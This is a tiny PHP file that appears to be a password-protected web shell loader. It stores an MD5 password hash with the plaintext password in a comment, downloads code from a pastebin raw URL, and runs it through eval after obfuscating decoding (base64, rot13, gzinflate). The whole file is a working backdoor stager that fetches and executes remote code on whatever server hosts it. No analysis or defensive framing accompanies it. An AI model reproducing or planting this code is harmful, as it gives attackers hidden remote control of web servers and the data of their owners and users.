<?php

$auth_pass = "99b539b0eb42283fe3bd296748a450e8"; // default : ngeuekuy
$ngeue = file_get_contents("http://pastebin.com/raw/ihCmCP9D");
eval(str_rot13(gzinflate(str_rot13(base64_decode(($ngeue))))));
